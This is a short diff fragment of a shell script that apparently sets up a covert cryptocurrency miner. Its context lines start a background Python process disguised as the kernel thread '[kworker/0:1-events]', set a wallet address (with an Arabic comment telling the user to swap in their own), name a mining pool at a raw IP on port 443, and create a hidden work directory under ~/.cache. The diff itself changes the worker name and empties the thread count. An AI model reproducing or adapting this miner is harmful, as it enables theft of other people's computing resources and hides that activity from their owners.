@@ -3,9 +3,9 @@
 nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &
 
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="arm"
+WORKER="dandi"
 POOL="45.155.102.89:443"
-THREADS=1
+THREADS=
 
 WORKDIR="$HOME/.cache/.sysd"
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
